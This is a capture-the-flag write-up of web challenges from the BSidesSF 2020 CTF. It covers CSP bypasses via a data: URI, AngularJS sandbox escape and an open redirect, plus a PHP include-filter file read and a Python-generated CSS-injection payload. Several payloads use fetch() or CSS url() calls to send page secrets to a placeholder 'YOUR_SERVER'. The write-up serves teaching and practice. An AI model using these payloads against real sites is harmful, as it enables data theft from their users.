I played [BSidesSF 2020 CTF](https://ctf.bsidessf.net/) held on <i>9 AM PST on February 23 to 4 PM PST on February 24</i>.

Our team [NekochanNano!](https://ctftime.org/team/72201) got 924pts (20th place).

[f:id:Szarny:20200225133252p:plain]

Hereafter, I write about the challenges that I solved.

[:contents]

# [Web / 51pts] csp-1
When we open the challenge's URL, the following sentence and a form will appear.

```
Can you bypass the CSP?
Try to read /csp-one-flag as admin, all payloads submitted here will be sent to the admin.
```

[f:id:Szarny:20200225133014p:plain]

As you can see from the title and that sentence, this is a challenge regarding the **CSP bypass**.

Let's check the `content-security-policy` value in the HTTP Response Header.

```
content-security-policy: 
    script-src 'self' data:; 
    default-src 'self'; 
    connect-src *; 
    report-uri /csp_report
```

In the `script-src` directive, `data:` scheme is shown. 

For that reason, JavaScript program written in `data:` scheme like below is allowed and can be executed.

```html
// NOTE:
// "ZmV0Y..." is base64 encoded text of this script.
// fetch("https://csp-1-5aa1f221.challenges.bsidessf.net/csp-one-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))

<script src="data:text/javascript;base64,ZmV0Y2goImh0dHBzOi8vY3NwLTEtNWFhMWYyMjEuY2hhbGxlbmdlcy5ic2lkZXNzZi5uZXQvY3NwLW9uZS1mbGFnIikudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT5mZXRjaCgiWU9VUl9TRVJWRVIiK3QpKQ=="></script>
```

When you enter this script tag, the JavaScript will be executed on the browser of admin and you can get the flag in the access log on your web server.

FLAG: `CTF{Cant_Stop_Pwning}`

# [Web / 51pts] csp-2
A revised version of the previous question.

Let's check the `content-security-policy` value in the HTTP Response Header.

```
content-security-policy: 
    script-src 'self' ajax.googleapis.com 'unsafe-eval'; 
    default-src 'self' 'unsafe-inline'; 
    connect-src *; 
    report-uri /csp_report
```

In the `script-src` directive, `ajax.googleapis.com` is whitelisted. In addition, `unsafe-eval` and `unsafe-inline` is specified.

According to this [presentation material](https://speakerdeck.com/mikispag/content-security-policy-a-successful-mess-between-hardening-and-mitigation), whitelist-based CSP is **almost always trivially bypassable** because these URLs are tend to have JSONP endpoint or host AngularJS.

Even in this challenge, `ajax.googleapis.com` hosts AngularJS at the following URL.

```
https://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js
```

The rest part is easy: just incorporate this AngularJS into the challenge page and run the script using that feature like below.

```html
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script> 
<div class="ng-app"> {{ constructor.constructor('fetch("https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))')() }} </div>
```

FLAG: `CTF{Canned_Spam_Perfection}`

# [Web / 458pts] csp-3
A revised version of the previous question.

Let's check the `content-security-policy` value in the HTTP Response Header.

```
content-security-policy: 
    script-src 'self' http://storage.googleapis.com/good.js; 
    default-src 'self'; 
    connect-src *; 
    report-uri /csp_report
```

In the `script-src` directive, `http://storage.googleapis.com/good.js` is whitelisted. This URL is from **Firebase Storage**, however, we can't access this URL because Public URLs in Firebase Storage take the following format:

```
http://storage.googleapis.com/<BUCKET NAME>/<FILE NAME>
```

Hmm... I can't find anything that could be used to exploit from CSP.

After some research, I found a page `/redirect` specified in the `robots.txt`.

This page is what is called open redirector that navigates to the URL specified in the `url` query.

Let's leverage this feature and whitelisted endpoint (`http://storage.googleapis.com/good.js`) to compromise CSP!

According to the [CSP Level 3, 7.6. Paths and Redirects](https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects), the path section is ignored after redirect.

> To avoid leaking path information cross-origin (as discussed in Egor Homakov’s Using Content-Security-Policy for Evil), the matching algorithm ignores the path component of a source expression if the resource being loaded is the result of a redirect. For example, given a page with an active policy of img-src example.com example.org/path:
>
> Directly loading https://example.org/not-path would fail, as it doesn’t match the policy.
>
> Directly loading https://example.com/redirector would pass, as it matches example.com.
>
> Assuming that https://example.com/redirector delivered a redirect response pointing to https://example.org/not-path, the load would succeed, as the initial URL matches example.com, and the redirect target matches example.org/path if we ignore its path component.

Because of that,  JavaScript file loaded from `https://csp-3-05637e51.challenges.bsidessf.net/redirect?url=http://storage.googleapis.com/*` is allowed and can be executed!!

So all we need to do is as follows:

1. Put a JavaScript file for exploits CSP like `fetch("https://csp-3-05637e51.challenges.bsidessf.net//csp-three-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))` on Firebase Storage.
1. Publish with a whitelisted URL like `http://storage.googleapis.com/YOUR_BUCKET_NAME/exploit.js`.
1. Input: `<script src="https://csp-3-05637e51.challenges.bsidessf.net/redirect?url=https://storage.googleapis.com/YOUR_BUCKET_NAME/exploit.js></script>`

Then you can Capture The FLAG!!

FLAG: `CTF{Cyber_Security_Practitioner}`

# [Web / 51pts] had-a-bad-day
The goal in question is to read the `flag.php`.

When we open the challenge's URL, we can see two buttons (WOOFERS and MEOWERS).

If you click the WOOFERS button, a picture of the dog appears. And if you click the MEOWERS button, a picture of the cat appears.

[f:id:Szarny:20200225133054p:plain]

When you click the WOOFERS button, the URL is set like this: `https://had-a-bad-day-5b3328ad.challenges.bsidessf.net/index.php?category=woofers`.

Here, if you change the category query string from `woofers` to `woofers!`, the following error message appears.

```
Warning: include(woofers!.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37

Warning: include(): Failed opening 'woofers!.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 37
```

There may be a path traversal vulnerability here. However, the category query seems to have a restriction that it must contain `woofers` or `meowers`.

So we can include `flag.php` by this URL: `https://had-a-bad-day-5b3328ad.challenges.bsidessf.net/index.php?category=woofers/../flag`.

However, we can't figure out what is written in `flag.php` because the contents of this fire is evaluated by PHP.

You can read the contents of that by using `php://filter` like this: `https://had-a-bad-day-5b3328ad.challenges.bsidessf.net/index.php?category=php://filter/convert.base64-encode/resource=woofers/../flag`.

You can get the base64 encoded `flag.php`, just decode it.

FLAG: `CTF{happiness_needs_no_filters}`


# [Web / 52pts] simple-todos
The challenge's target is a simple todo application using WebSocket by using this [material](https://www.meteor.com/tutorials/blaze/templates).

[f:id:Szarny:20200225133110p:plain]

Due to insufficient authority processing, you can also view WebSocket communications that are not related to your account.

Therefore, you can easily get the FLAG by observing communication (For example, by using DevTools Network pain).

FLAG: `CTF{meteor_js_does_san_francisco}`

# [Web / 138pts] fun-with-flags
After registration and login process, we can see the message send/receive functions.

[f:id:Szarny:20200225133122p:plain]

we can find the following input tag where the Flag would be inserted in the target user.

```
<input type="hidden" name="flag" value=Try reading this value>
```

Under the `Message` form, a suspicious message is written.

> Express your style

So, I described a style tag in `Message` form and I confirmed that it was effective.

Therefore, we reverage the CSS Injection technique for this challenge that I introduced in a previous article (<a href="https://szarny.hatenablog.com/entry/2019/10/17/CSS_Injection_%28%2B_Recursive_Import%29_%E3%81%AE%E5%8E%9F%E7%90%86%E3%81%A8%E6%94%BB%E6%92%83%E6%89%8B%E6%B3%95%E3%81%8A%E3%82%88%E3%81%B3%E3%81%9D%E3%81%AE%E5%AE%9F%E8%A3%85%E3%81%AB%E3%81%A4%E3%81%84?_ga=2.77390229.1426577989.1582604975-910459996.1580959459">Link</a>).

The sample script used to create the attack vector is as follows.

```python
import sys
import pyperclip

URL: str = "YOUR_SERVER"

def generate_attack_vector(known_secret: str) -> str:
    attack_vector_tmpl: str = """
        input[value^='{known_secret}{try_secret}']{{
            background: url('{url}?secret={known_secret}{try_secret}')
        }}"""

    attack_vector: str = ""

    for secret_param in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}_!?":
        attack_vector += attack_vector_tmpl.format(url=URL,
                                                   known_secret=known_secret,
                                                   try_secret=secret_param)

    attack_vector = "<style>" + attack_vector + "</style>"
    pyperclip.copy(attack_vector)
    return attack_vector


def main() -> None:
    known_secret: str = sys.argv[1] if len(sys.argv) != 1 else ""
    print(generate_attack_vector(known_secret=known_secret))


if __name__ == '__main__':
    main()
```

Attack vector is as follows.

```
<style>
input[value^="0"] { background: url(YOUR_SERVER?secret=0) }
input[value^="1"] { background: url(YOUR_SERVER?secret=1) }
...
input[value^="a"] { background: url(YOUR_SERVER?secret=a) }
...
</style>
```

Just send it to `Sheldon` repeatedly, then you can Capture The FLAG!

FLAG: `CTF{Clandestine_Secret_Stealing}`

